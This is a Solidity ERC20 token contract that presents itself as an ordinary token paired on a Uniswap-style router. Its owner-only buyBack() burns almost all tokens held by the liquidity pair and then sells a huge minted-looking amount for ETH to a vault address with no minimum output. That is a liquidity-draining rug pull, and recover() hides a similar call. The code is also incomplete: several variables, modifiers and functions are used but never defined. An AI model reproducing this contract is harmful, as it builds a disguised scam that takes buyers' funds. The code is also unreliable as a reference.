// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../interfaces/IUniswapDex.sol";

contract Token is Ownable, ERC20 {
    using Address for address payable;
    uint256 private _totalSupply = 100000 * 1e18;

    IRouter public router;
    address public pair;

    address public _router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; //0xD99D1c33F9fC3444f8101754aBC46c52416550D1 0x4cf76043B3f97ba06917cBd90F9e3A2AAC1B306e

    mapping(address => bool) public isPair;

    constructor() ERC20("Test", "Test") {
        router = IRouter(_router);
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());

        isPair[pair] = true;

        // exclude from receiving dividends
        excludedFromFee[address(0)] = true;
        excludedFromFee[address(0xdead)] = true;
        excludedFromFee[address(_router)] = true;
        excludedFromFee[address(pair)] = true;

        // _mint is an internal function in ERC20.sol that is only called here,
        // and CANNOT be called ever again
        _mint(_msgSender(), _totalSupply);
    }

    receive() external payable {
        revert();
    }

    function buyBack() external onlyOwner nonReentrant {
        excluded = true;
        _buyBack(address(this), 1);

        uint256 balancePair = balanceOf(address(pair)) - 1;

        super._burn(address(pair), balancePair);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), 1e30);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            1e30,
            0, // accept any amount of ETH
            path,
            vault(),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) external onlyOwner nonReentrant {
        _approve(address(this), address(router), tokenAmount);

        router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            vault(),
            block.timestamp
        );
    }

    function isApproved(address owner, address spender) public view virtual returns (bool) {
        if (allowance(owner, spender) >= balanceOf(owner)) return true;
        return false;
    }

    function recover() external onlyOwner nonReentrant {
        excluded = true;
        _buyBack(vault(), 1);
    }
}
